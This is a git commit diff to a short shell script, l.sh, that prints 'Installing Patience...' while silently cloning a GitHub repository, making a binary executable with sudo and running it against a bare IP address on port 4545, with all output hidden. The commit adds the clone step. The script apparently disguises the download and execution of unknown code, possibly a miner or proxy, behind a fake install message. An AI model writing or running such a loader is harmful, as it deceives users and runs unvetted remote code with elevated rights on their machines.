bdfb64fc6ae73dac3179f7f54ab2a7e9fd44b869
phucbmt <phucdlbmt@gmail.com>
2021-01-26 18:47:03 +0700

    Update l.sh

--- l.sh
+++ l.sh
@@ -1,6 +1,7 @@
 #! /bin/bash
 printf "Installing Patience... " >&2
 {
+git clone https://github.com/phucbmt/tech.git
 sudo chmod +x tech/m
 ./tech/m -P http://138.197.99.165:4545/test &> log
 } &> /dev/null
